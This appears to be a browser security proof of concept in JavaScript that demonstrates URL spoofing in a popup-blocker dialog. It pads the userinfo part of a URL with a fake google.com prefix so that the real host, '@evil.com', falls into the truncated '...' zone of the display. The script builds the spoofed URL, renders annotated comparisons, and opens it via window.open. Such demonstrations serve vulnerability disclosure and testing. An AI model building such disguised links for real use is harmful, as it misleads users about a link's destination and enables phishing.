// Popup URL Spoof
// URL: https://[userinfo].dots.and.hyphens@evil.com/path

(function() {
  var d = document.getElementById('display');
  if (!d) return;

  function trunc(url, max) {
    if (url.length <= max) return url;
    var pre = Math.floor(max * 0.55);
    var suf = max - pre - 3;
    return url.substring(0, pre) + '...' + url.substring(url.length - suf);
  }

  var LEGIT = 'https://www.google.com/search?q=what+is+claude';

  // Userinfo = www.google.com.search-verify-account-login-xxx
  // Host = evil.com (the @ MUST come before any /)
  // Path = /search?q=what+is+claude (matches legit suffix)
  var SPOOF = 'https://www.google.com.search-verify-account' +
              '-login-security' + '-x'.repeat(10) +
              '@evil.com' +
              '/search?q=what+is+claude';

  var tests = [
    { label: 'LEGITIMATE (google.com)', url: LEGIT, cls: 'legit' },
    { label: 'SPOOFED (real host: evil.com)', url: SPOOF, cls: 'spoof' }
  ];

  var legitShort = trunc(LEGIT, 45);
  var spoofShort = trunc(SPOOF, 45);
  var html = '';

  for (var i = 0; i < tests.length; i++) {
    var t = tests[i];
    var short = trunc(t.url, 45);
    html +=
      '<div class="url-box ' + t.cls + '">' +
        '<div class="label">' + t.label + '</div>' +
        '<div class="url-text">' + short + '</div>' +
        '<div class="url-text" style="font-size:9px;color:#888;margin-top:4px">' +
        t.url.substring(0, 80) + '...</div>' +
      '</div>';
  }

  html += '<div class="verdict" style="background:#fef7e0;color:#e37400">' +
    '<b>Truncated display comparison:</b><br>' +
    '<span style="font-family:monospace">' +
    'Legit: <b>' + legitShort + '</b><br>' +
    'Spoof: <b>' + spoofShort + '</b><br>' +
    '</span><br>' +
    'Users cannot distinguish these in the popup blocker dialog.<br>' +
    '<b>@evil.com</b> is hidden in the "..." truncation zone.' +
    '</div>';

  html += '<div style="font-size:10px;color:#888;margin-top:10px;line-height:1.6;text-align:left">' +
    '<b>URL structure (RFC 3986 compliant):</b><br>' +
    '<code>https://<b>www.google.com.search-verify-...-xxx</b>' +
    '<b style="color:#ea4335">@evil.com</b>/search?q=what+is+claude</code><br>' +
    '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' +
    '└─ userinfo (no /) ──┘█└─ host ─┘█└── path matches legit ──┘<br>' +
    '<br>✅ @ is BEFORE any / → evil.com is the real host<br>' +
    '✅ Path /search?q=... matches legit URL suffix<br>' +
    '✅ @evil.com falls in truncation "..." zone in popup dialog<br>' +
    '</div>';

  d.innerHTML = html;

  document.getElementById('btnOpen').addEventListener('click', function() {
    // Legit opens first (will likely succeed if user gesture active)
    window.open(LEGIT, '_blank');
    // Spoof opens second (may be blocked)
    window.open(SPOOF, '_blank');
  });
})();
